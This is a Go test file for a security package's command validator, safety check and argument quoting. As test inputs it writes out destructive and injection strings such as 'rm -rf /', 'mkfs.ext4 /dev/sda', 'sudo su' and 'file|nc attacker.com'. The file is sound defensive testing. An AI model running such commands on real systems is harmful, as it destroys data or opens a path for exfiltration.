package security

import (
	"testing"
)

// TestCommandValidation tests command validation
func TestCommandValidation(t *testing.T) {
	cmdValidator := NewCommand()

	tests := []struct {
		name      string
		command   string
		args      []string
		shouldErr bool
		reason    string
	}{
		{
			name:      "safe command",
			command:   "ls",
			args:      []string{"-la"},
			shouldErr: false,
			reason:    "safe command should be allowed",
		},
		{
			name:      "legitimate go build with ldflags",
			command:   "go",
			args:      []string{"build", "-ldflags=-X main.version=$VERSION"},
			shouldErr: false,
			reason:    "legitimate go build command with $ in args should be allowed (exec.Command treats $ as literal)",
		},
		{
			name:      "safe pipe character in argument",
			command:   "echo",
			args:      []string{"file | not-a-shell-command"},
			shouldErr: false,
			reason:    "pipe in argument is safe with exec.Command (treated as literal string)",
		},
		{
			name:      "safe backticks in argument",
			command:   "echo",
			args:      []string{"`whoami`"},
			shouldErr: false,
			reason:    "backticks in argument are safe with exec.Command (treated as literal string)",
		},
		{
			name:      "safe $() in argument",
			command:   "echo",
			args:      []string{"$(whoami)"},
			shouldErr: false,
			reason:    "command substitution in argument is safe with exec.Command (treated as literal string)",
		},
		{
			name:      "embedded dangerous command pattern in arg",
			command:   "cat",
			args:      []string{"rm -rf /"},
			shouldErr: true,
			reason:    "embedded dangerous command pattern should be blocked",
		},
		{
			name:      "null byte in argument",
			command:   "echo",
			args:      []string{"hello\x00world"},
			shouldErr: true,
			reason:    "null byte in argument should be blocked (injection attack)",
		},
		{
			name:      "extremely long argument",
			command:   "echo",
			args:      []string{string(make([]byte, 20000))},
			shouldErr: true,
			reason:    "extremely long argument should be blocked (DoS risk)",
		},
		{
			name:      "rm command blocked by whitelist",
			command:   "rm",
			args:      []string{"file.txt"},
			shouldErr: true,
			reason:    "rm is not in whitelist (secure by default)",
		},
		{
			name:      "empty command",
			command:   "",
			args:      []string{"arg1"},
			shouldErr: true,
			reason:    "empty command should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := cmdValidator.ValidateCommand(tt.command, tt.args)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for %q, but got none: %s", tt.command, tt.reason)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("unexpected error for %q: %v (%s)", tt.command, err, tt.reason)
			}
		})
	}
}

// TestStrictCommandValidator tests command validator (whitelist mode)
// NOTE: NewCommand() now uses whitelist mode by default for security
func TestStrictCommandValidator(t *testing.T) {
	validator := NewCommand()

	tests := []struct {
		name      string
		command   string
		args      []string
		shouldErr bool
	}{
		{
			name:      "allowed command - ls",
			command:   "ls",
			args:      []string{"-la"},
			shouldErr: false,
		},
		{
			name:      "allowed command - git status",
			command:   "git",
			args:      []string{"status"},
			shouldErr: false,
		},
		{
			name:      "disallowed command - rm",
			command:   "rm",
			args:      []string{"-rf", "/"},
			shouldErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateCommand(tt.command, tt.args)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for %q", tt.command)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("unexpected error for %q: %v", tt.command, err)
			}
		})
	}
}

// TestIsCommandSafe tests the quick command safety check
func TestIsCommandSafe(t *testing.T) {
	tests := []struct {
		command string
		safe    bool
	}{
		{"ls -la", true},
		{"rm -rf /", false},
		{"mkfs.ext4 /dev/sda", false},
		{"sudo su", false},
		{"echo hello", true},
	}

	for _, tt := range tests {
		result := IsCommandSafe(tt.command)
		if result != tt.safe {
			t.Errorf("IsCommandSafe(%q) = %v, want %v", tt.command, result, tt.safe)
		}
	}
}

// TestQuoteCommandArgs tests command argument quoting
func TestQuoteCommandArgs(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected []string
	}{
		{
			name:     "safe args",
			args:     []string{"file.txt", "output.txt"},
			expected: []string{"file.txt", "output.txt"},
		},
		{
			name:     "args with semicolon",
			args:     []string{"file;rm -rf /"},
			expected: []string{"'file;rm -rf /'"},
		},
		{
			name:     "args with pipe",
			args:     []string{"file|nc attacker.com"},
			expected: []string{"'file|nc attacker.com'"},
		},
		{
			name:     "empty arg",
			args:     []string{"", "file.txt"},
			expected: []string{"file.txt"},
		},
		{
			name:     "args with ampersand",
			args:     []string{"file&&evil"},
			expected: []string{"'file&&evil'"},
		},
		{
			name:     "args with backticks",
			args:     []string{"file`whoami`"},
			expected: []string{"'file`whoami`'"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := QuoteCommandArgs(tt.args)
			if len(result) != len(tt.expected) {
				t.Errorf("expected %d args, got %d", len(tt.expected), len(result))
				return
			}
			for i := range result {
				if result[i] != tt.expected[i] {
					t.Errorf("arg[%d] = %q, want %q", i, result[i], tt.expected[i])
				}
			}
		})
	}
}

// TestCommandValidationEdgeCases tests edge cases in command validation
func TestCommandValidationEdgeCases(t *testing.T) {
	cmdValidator := NewCommand()

	tests := []struct {
		name      string
		command   string
		args      []string
		shouldErr bool
		reason    string
	}{
		{
			name:      "args with && operator but no dangerous pattern",
			command:   "grep",
			args:      []string{"pattern", "&&", "file.txt"},
			shouldErr: false,
			reason:    "&& in args is safe with exec.Command (treated as literal)",
		},
		{
			name:      "args with || operator but no dangerous pattern",
			command:   "grep",
			args:      []string{"pattern", "||", "file.txt"},
			shouldErr: false,
			reason:    "|| in args is safe with exec.Command (treated as literal)",
		},
		{
			name:      "args containing dangerous pattern with newline",
			command:   "echo",
			args:      []string{"hello\nrm -rf /"},
			shouldErr: true,
			reason:    "embedded dangerous pattern 'rm -rf /' should be blocked even with newline",
		},
		{
			name:      "safe args only",
			command:   "cat",
			args:      []string{"file.txt"},
			shouldErr: false,
			reason:    "safe command with safe args should be allowed",
		},
		{
			name:      "args with redirection characters",
			command:   "echo",
			args:      []string{"output > file.txt"},
			shouldErr: false,
			reason:    "redirection in args is safe with exec.Command (treated as literal)",
		},
		{
			name:      "args with semicolon but no dangerous pattern",
			command:   "echo",
			args:      []string{"hello; world"},
			shouldErr: false,
			reason:    "semicolon in args is safe with exec.Command (treated as literal)",
		},
		{
			name:      "command name with pipe",
			command:   "ls|cat",
			args:      []string{},
			shouldErr: true,
			reason:    "pipe in command name should be blocked",
		},
		{
			name:      "command name with shell metachar",
			command:   "ls>file",
			args:      []string{},
			shouldErr: true,
			reason:    "shell metacharacter in command name should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := cmdValidator.ValidateCommand(tt.command, tt.args)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for %q, but got none: %s", tt.name, tt.reason)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("unexpected error for %q: %v (%s)", tt.name, err, tt.reason)
			}
		})
	}
}
